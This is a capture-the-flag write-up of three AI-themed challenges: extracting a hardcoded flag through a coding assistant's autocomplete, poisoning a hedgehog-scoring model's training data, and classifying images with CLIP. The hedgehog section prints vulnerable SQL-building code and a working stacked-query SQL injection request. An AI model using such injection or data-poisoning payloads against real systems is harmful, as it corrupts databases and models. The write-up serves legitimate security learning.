---
title: "GovTech AI CTF 2025 WriteUp"
date: 2025-10-11 09:00:00 +0800
categories: [CTF WriteUps]
tags: []
---

# AI CTF 2025

## Co-Pirate:

### CTF Prompt:

```
Co-Pirate

Hard code first, change later. Ahhh... what a familiar phrase in the software development 
world. But someone's been watching all these from day 1 and its none other than your most 
trusty co-pilot. The team has now discovered this bug and it is now termed co-pirate, but 
what does he know? That's for me to know and for you to find out. Maybe try solve this 
question slowly and you might find something along the lines?

https://co-pirate.aictf.sg

```

### Analysis of the webpage:

Webpage view:

![image.png](assets/img/AI_CTF_2025/Co_Pirate_Webpage_View.png)

Analysis:

- The Web page is a web based IDE used to compile C++ code
- Seeing at the CTF challenge name is reference to co-pilot, there has to be similar features

Looking the `external.js` source code for clues:

```javascript
const fetchAISuggestions = async (range, word, codeUntilCursor) => {
    try {
        const res = await fetch(`/autocomplete`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                message: {
                    word: word,
                    code: codeUntilCursor,
                    row: range.endLineNumber,
                    column: range.endColumn
                }
            })
        });
        if (!res.ok) {
            return [];
        }
        const data_string = await res.json();
        const data = data_string.response;
        console.log('AI Suggestions:', data);
        // Handle different possible structures
        const suggestions = Array.isArray(data)
            ? data
            : (data?.suggestions || [data]);
        // Validate and sanitize
        const cleaned = suggestions
            .filter((s) => typeof s.insertText === 'string' && s.insertText.trim() !== '')
            .map((s, i) => ({
            label: s.label || `AI Suggestion ${i + 1}`,
            insertText: s.insertText,
            kind: monaco.languages.CompletionItemKind.Snippet,
            range,
        }));
        // Fallback if empty
        if (cleaned.length === 0) {
            return [];
        }
        return cleaned;
    }
    catch (err) {
        return [];
    }
};
```

Analysis:

- There is a `fetchAISuggestions` function that is exposed to client side
- Calling a `/autocomplete` API endpoint for autocomplete suggestions and returning as json

### Solution

Getting the flag via `autocomplete` function:

![image.png](assets/img/AI_CTF_2025/Co_Pirate_Win.png)

Solution:

- A reasonable assumption was made that the “hardcoding” that the prompt mentioned might be the flag, or the flag variable
- Type out the flag variable and anticipate autocomplete for the flag (BINGO!)

## The Best HedgeHog

### CTF Prompt:

```
The best hedgehog

Hmm, I think there is a way to make me the Best Hedgehog ever! Help me do it, and I'll re-
ward you generously!

~ Jaga, the Cybersecurity Hedgehog

```

Webpage training data:

![image.png](assets/img/AI_CTF_2025/The_best_hedgehog_Training_Data.png)

Premise:

- **Given a Model trained on 11 hedgehogs (excluding jaga). Jaga's test evaluation: 41.28 (Need 100.0 to get the flag!)**
- 11 hedgehogs training data consists of 10 preset by the challenge author and 1 controlled by the user.
- Given the skewed set of training data preset by the challenge author to favour higher overall scores, how can we use the methods given to us to help **jaga** obtain an `AI Evaulation score == 100`

### Solution:

Idea:

- Add **one “twin” training row** whose 6 inputs are **exactly Jaga’s scores** and whose target/label is **100**

ChatGPT explains:

```
k-NN / tree models: 
The nearest (identical) neighbor has label 100 → prediction becomes 100 (or very close if it
averages a few neighbors).

Kernel/RBF models & SVMs:
Training includes a basis function centered at each point. A point at Jaga’s coordinates with 
label 100 gives a large influence right where we need it.

Neural nets (MSE loss) / regressors: 
Gradients from that one sample keep pushing the function upward at Jaga’s coordinates. With 
enough capacity/epochs (and no hard output cap) the model can fit that sample nearly exactly.

Linear/Ridge: 
You won’t hit 100 exactly for everyone, but adding one sample at Jaga’s x with y=100 still 
shifts the hyperplane to raise the prediction at that location the most per added point.
```

Attempt 1:

![image.png](assets/img/AI_CTF_2025/The_best_hedgehog_First_Trial.png)

Analysis:

- By adding 1 j0 dataset, it does not appear to be enough to skew the entire models

#### SQL injection vulnerability:

Taking a look at the implementation of the web application in app.py:

```sql
def add_hedgehog():
    """Add a new hedgehog to the database and retrain the AI model."""
    username = request.form['username']
    furriness = request.form['furriness']
    cuteness = request.form['cuteness']
    friendliness = request.form['friendliness']
    curiosity = request.form['curiosity']
    agility = request.form['agility']
    sleepiness = request.form['sleepiness']
```

Analysis:

- Takes in user input via the HTTP POST form

Inserting into the table:

```python

    if evaluation_score is not None:
        query = f"""
            INSERT INTO hedgehogs (username, furriness, cuteness, friendliness, 
                                   curiosity, agility, sleepiness, evaluation_score)
            VALUES ('{username}', {furriness}, {cuteness}, {friendliness}, 
                    {curiosity}, {agility}, {sleepiness}, {evaluation_score})
        """
    else:
        query = f"""
            INSERT INTO hedgehogs (username, furriness, cuteness, friendliness, 
                                   curiosity, agility, sleepiness)
            VALUES ('{username}', {furriness}, {cuteness}, {friendliness}, 
                    {curiosity}, {agility}, {sleepiness})
        """
 
```

Analysis:

- Due to the implementation of inserting values using python format string, which is vulnerable to SQL injection, the user/client is able to inject arbitrary SQL commands or values into the table
- Seeing as injecting SQL values to the table is possible, an attempt can be made to inject more values in order to make jaga’s test results more ideal

Intercepting the request on burpsuite to add more training data:

```
POST /add_hedgehog HTTP/2
Host: best-hedgehog.aictf.sg
Content-Length: 833
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Sec-Ch-Ua: "Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"
Dnt: 1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryi0F1CSn4Hs6XljlT
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://best-hedgehog.aictf.sg
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://best-hedgehog.aictf.sg/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Priority: u=1, i

------WebKitFormBoundaryi0F1CSn4Hs6XljlT
Content-Disposition: form-data; name="username"

j0
------WebKitFormBoundaryi0F1CSn4Hs6XljlT
Content-Disposition: form-data; name="furriness"

45
------WebKitFormBoundaryi0F1CSn4Hs6XljlT
Content-Disposition: form-data; name="cuteness"

50
------WebKitFormBoundaryi0F1CSn4Hs6XljlT
Content-Disposition: form-data; name="friendliness"

40
------WebKitFormBoundaryi0F1CSn4Hs6XljlT
Content-Disposition: form-data; name="curiosity"

35
------WebKitFormBoundaryi0F1CSn4Hs6XljlT
Content-Disposition: form-data; name="agility"

48
------WebKitFormBoundaryi0F1CSn4Hs6XljlT
Content-Disposition: form-data; name="sleepiness"

42);
INSERT INTO hedgehogs
(username,furriness,cuteness,friendliness,curiosity,agility,sleepiness,evaluation_score)
VALUES
('k1',45,50,40,35,48,42,300),
('k2',45,50,40,35,48,42,300),
('k3',45,50,40,35,48,42,300),
('k4',45,50,40,35,48,42,300),
('k5',45,50,40,35,48,42,300),
('k6',45,50,40,35,48,42,300),
('k7',45,50,40,35,48,42,300),
('k8',45,50,40,35,48,42,300),
('k9',45,50,40,35,48,42,300),
('k10',45,50,40,35,48,42,300),
('k11',45,50,40,35,48,42,300),
('k12',45,50,40,35,48,42,300),
('k46',45,50,40,35,48,42,300);--

------WebKitFormBoundaryi0F1CSn4Hs6XljlT
Content-Disposition: form-data; name="evaluation_score"

------WebKitFormBoundaryi0F1CSn4Hs6XljlT--
```

Results:

![image.png](assets/img/AI_CTF_2025/The_best_hedgehog_Win_message.png)

## Stridesafe:

### CTF Prompt:

```
StrideSafe

Singapore's lamp posts are getting smarter. They don't just light the way, they watch over th-
e pavements.

Your next-gen chip has been selected for testing. Can your chip distinguish pedestrians from 
bicycles and PMDs (Personal Mobility Devices)?

Pass the test, and your chip will earn development on Singapore's smart lamp posts. Fail and
hazards roam free on pedestrian walkways

https://stridesafe.aictf.sg

```

Data Folder:

![image.png](assets/img/AI_CTF_2025/Stride_Safe_Images.png)

Premise:

- CTF challenge requires the user to write code in order to differentiate between bikes or PMDs vs humans
- Given this output, process and visualise it as a matplotlilb in python, as provided in their deploy-script.py

Deploy-script.py:

```python
import numpy as np
import matplotlib
matplotlib.use("Agg")           # must be before pyplot
import matplotlib.pyplot as plt

results = []
results_arr = np.array(results)
size = int(np.sqrt(len(results_arr)))  # your list length is 1089 → 33x33

plt.figure(figsize=(3,3))
plt.imshow(1 - results_arr.reshape((size, size)), cmap="gray")
plt.axis('off')
plt.savefig("results.png", bbox_inches="tight", pad_inches=0)
print("saved to results.png")
```

### Solution:

Solution thought process:

- Given that there are alot of images within the data folder, I am inclined to write a script in order to process these images
- Using OpenAI’s CLIP downloaded from github, CLIP was trained on **400 million** image–text pairs collected from the internet and it can perform image classification by providing prompts
    
    Example:
    
    ```
    Prompts:
    “a photo of a cat”
    “a photo of a dog”
    “a photo of a car”
    
    CLIP encodes both the image and each prompt.
    It computes cosine similarity between the image embedding and each text embedding. The label with the highest similarity wins.
    ```
    

Proof of concept:

```python
#!/usr/bin/env python3
"""
Two-class CLIP classifier:
  - "human"
  - "bike_or_pmd" (bicycles + PMDs like e-scooters, kick scooters, Segway, hoverboard)

Features:
- Works on individual files or folders (recursive).
- GPU if available, else CPU.
- --json to emit one JSON object per image.
- --show to overlay the label using OpenCV.
- Robust printing (casts probs to float to avoid formatting errors).

Setup (example):
  pip install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu124
  pip install git+https://github.com/openai/CLIP.git
  pip install pillow tqdm opencv-python
"""

import argparse
import json
from pathlib import Path
from typing import List, Dict, Tuple

import torch
import clip
from PIL import Image, ImageOps
from tqdm import tqdm

try:
    import cv2  # only used when --show
except Exception:
    cv2 = None

# ----- Prompt sets -----
PERSON_PROMPTS = [
    "a photo of a person",
    "a photo of a human",
    "a pedestrian",
    "a photo of a group of humans or people",
    "a portrait of a person",
    "a photo of a baby",
    "an image of a human figure",
    "an image of a male toilet figure",
    "a photo of a child",
    "a photo of an infant",
    "a photo of a human portrait",
    "a full-body photo of a person",
    "a person walking outdoors",
]

BIKE_PROMPTS = [
    "a photo of a bicycle",
    "a bike parked on the street",
    "a road bike",
    "a mountain bike",
]

PMD_PROMPTS = [
    "a photo of a scooter",
    "an electric scooter",
    "a kick scooter",
    "a personal mobility device",
]

TEXT_GROUPS = {
    "human": PERSON_PROMPTS,
    "bike": BIKE_PROMPTS,
    "pmd": PMD_PROMPTS,
}

FINAL_LABELS = ["human", "bike_or_pmd"]  # exactly two classes

# ----- Utilities -----
def list_images(paths: List[str], exts: List[str]) -> List[Path]:
    out: List[Path] = []
    for p in paths:
        pp = Path(p)
        if pp.is_file() and pp.suffix.lower() in exts:
            out.append(pp)
        elif pp.is_dir():
            for ext in exts:
                out.extend(pp.rglob(f"*{ext}"))
    # dedupe + sort
    return sorted(dict.fromkeys(out))

def load_model(name: str, device: str):
    model, preprocess = clip.load(name, device=device, jit=False)
    model.eval()
    return model, preprocess

@torch.no_grad()
def build_text_features(model, device: str) -> Tuple[torch.Tensor, Dict[str, slice]]:
    prompts: List[str] = []
    slices: Dict[str, slice] = {}
    start = 0
    for k, lst in TEXT_GROUPS.items():
        prompts.extend(lst)
        end = start + len(lst)
        slices[k] = slice(start, end)
        start = end

    tokens = clip.tokenize(prompts).to(device)
    feats = model.encode_text(tokens)  # (N, D)
    feats = feats / feats.norm(dim=-1, keepdim=True)
    return feats, slices

def softmax(x: torch.Tensor, dim=-1) -> torch.Tensor:
    return torch.nn.functional.softmax(x, dim=dim)

def to_float(x, default=0.0) -> float:
    try:
        return float(x)
    except (TypeError, ValueError):
        return default

# ----- Core -----
@torch.no_grad()
def classify_image(model, preprocess, path: Path, text_feats, slices, device: str) -> Dict:
    img = Image.open(path).convert("RGB")
    img = ImageOps.exif_transpose(img)  # fix EXIF rotation if present
    inp = preprocess(img).unsqueeze(0).to(device)

    img_feat = model.encode_image(inp)  # (1, D)
    img_feat = img_feat / img_feat.norm(dim=-1, keepdim=True)

    logits = (img_feat @ text_feats.T).squeeze(0)  # (N_prompts,)

    # group score = max prompt score per group
    gscore = {
        "human": float(logits[slices["human"]].max().item()),
        "bike": float(logits[slices["bike"]].max().item()),
        "pmd": float(logits[slices["pmd"]].max().item()),
    }

    # Convert to three-way probabilities for diagnostics
    three = torch.tensor([gscore["human"], gscore["bike"], gscore["pmd"]], device=device)
    probs3 = softmax(three, dim=0).cpu().numpy().tolist()
    p_human, p_bike, p_pmd = probs3

    # Collapse to two classes: human vs bike_or_pmd
    p_bop = max(p_bike, p_pmd)  # bike_or_pmd
    p_hum = p_human

    label = "human" if p_hum >= p_bop else "bike_or_pmd"
    confidence = max(p_hum, p_bop)

    meta = {
        "group_scores": gscore,
        "three_way_probs": {"human": p_human, "bike": p_bike, "pmd": p_pmd},
        "two_way_probs": {"human": p_hum, "bike_or_pmd": p_bop},
        "chosen_confidence": confidence,
    }
    return {"path": str(path), "label": label, "probs": meta["two_way_probs"], "meta": meta}

def main():
    ap = argparse.ArgumentParser(description="CLIP two-class: human vs bike_or_pmd")
    ap.add_argument("paths", nargs="+", help="Image files and/or folders")
    ap.add_argument("--model", default="ViT-B/32", help="CLIP model (e.g., ViT-B/32, ViT-L/14)")
    ap.add_argument("--device", default="cuda" if torch.cuda.is_available() else "cpu")
    ap.add_argument("--exts", nargs="*", default=[".jpg", ".jpeg", ".png", ".bmp", ".webp"])
    ap.add_argument("--show", action="store_true", help="OpenCV overlay preview")
    args = ap.parse_args()

    device = args.device
    model, preprocess = load_model(args.model, device)
    text_feats, slices = build_text_features(model, device)

    images = list_images(args.paths, [e.lower() for e in args.exts])
    if not images:
        raise SystemExit("No images found for the given inputs/extensions.")

    result = []  # 1 for human, 0 for bike_or_pmd

    for p in tqdm(images):
        r = classify_image(model, preprocess, p, text_feats, slices, device)

        bit = 1 if r["label"] == "human" else 0
        result.append(bit)

        if args.show and cv2 is not None:
            img_bgr = cv2.imread(str(p))
            if img_bgr is not None:
                text = f"{r['label']} ({to_float(r['meta']['chosen_confidence']):.2f})"
                cv2.putText(img_bgr, text, (12, 32), cv2.FONT_HERSHEY_SIMPLEX, 1.0, (0, 0, 0), 3, cv2.LINE_AA)
                cv2.putText(img_bgr, text, (12, 32), cv2.FONT_HERSHEY_SIMPLEX, 1.0, (255, 255, 255), 2, cv2.LINE_AA)
                cv2.imshow("CLIP: human vs bike_or_pmd", img_bgr)
                cv2.waitKey(0)

    # Print the final array once
    print(result)
    
if __name__ == "__main__":
    main()
```

Analysis:

- This will print the result as an array of 1s and 0s where 1s represent the human images and 0s represent the bikes and PMD images, in order.

Problems faced:

- While solving the challenge, the code initially were unable to identify some figures of humans and infants. These were some edge cases that the original prompts could not catch, as a result were wrongly classified into the bikes and PMDs group

Original prompts for the humans group:

```python
PERSON_PROMPTS = [
    "a photo of a person",
    "a photo of a human",
    "a pedestrian",
    "a portrait of a person",
    "a full-body photo of a person",
    "a person walking outdoors",
]
```

Analysis:

- While scanning through the images, there were much more human figures, silhouette and infant/baby images rather than pedestrian images. As a result, I added some additional prompts to account for those images

Updated prompts for the humans group:

```python
PERSON_PROMPTS = [
    "a photo of a person",
    "a photo of a human",
    "a pedestrian",
    "a photo of a group of humans or people",
    "a portrait of a person",
    "a photo of a baby",
    "an image of a human figure",
    "an image of a male toilet figure",
    "a photo of a child",
    "a photo of an infant",
    "a photo of a human portrait",
    "a full-body photo of a person",
    "a person walking outdoors",
]
```

Resulting in an array of result which were inputted into the matplot and exported as an image:

```python
import numpy as np
import matplotlib
matplotlib.use("Agg")           # must be before pyplot
import matplotlib.pyplot as plt

results = [1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 0, 1, 1, 1, 0, 1, 0, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 0, 0, 1, 0, 0, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 0, 1, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1, 0, 0, 1, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1]
results_arr = np.array(results)
size = int(np.sqrt(len(results_arr)))  # your list length is 1089 → 33x33

plt.figure(figsize=(3,3))
plt.imshow(1 - results_arr.reshape((size, size)), cmap="gray")
plt.axis('off')
plt.savefig("results.png", bbox_inches="tight", pad_inches=0)
print("saved to results.png")
```

Results:

![results.png](assets/img/AI_CTF_2025/Stride_Safe_Win.png)

Analysis:

- Notice that it shows a pattern similar to a QR code which when scanned obtained the flag `AI2025{5tr1d3s4f3_15_l1t}`